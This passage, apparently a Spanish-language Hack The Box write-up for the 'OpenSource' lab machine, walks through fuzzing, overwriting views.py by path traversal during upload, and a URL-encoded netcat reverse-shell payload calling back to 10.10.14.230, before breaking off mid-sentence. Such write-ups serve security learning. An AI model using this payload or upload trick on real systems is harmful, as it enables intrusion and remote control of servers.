---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | OpenSource         |
| Os                     | Linux              |
| Difficulty             | Easy               |
| Points                 | 20                 |
| IP                     | 10.10.11.164       |

## [](#header-2)Introduccion

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/OpenSource/scan1.png)

Fuzzing

```s
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/wfuzz/webservices/ws-files.txt http://10.10.11.164/uploads/FUZZ
```

Podemos descargarnos el codigo fuente de la aplicacion, tambien vemos que no revisa que el archivo ya existe. Asi que intentaremos reemplazar views.py con las lineas siguientes:

![Scan 1](/assets/images/OpenSource/code_modificado.png)

Procedemos a usar burpsuite, para modificar el response del post. Cambiamos el nombre del archivo a ..//app/app/views.py y de esta manera, lo habremos puesto donde esta el original, pero con una funcion extra que nos permitira ejecutar los comandos que queramos. Y ahora podremos ejecutar comandos de cmd con:

_http://opensource.htb/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.230%204444%20%3E%2Ftmp%2Ff_

![Shell to Docker container](/assets/images/OpenSource/reverse_shell.png)

Con un ifconfig, vimos que tenemos una interfaz extrana, la cual significara que estamos en un docker container. Para salir de el contenedor, habra que levantar un 
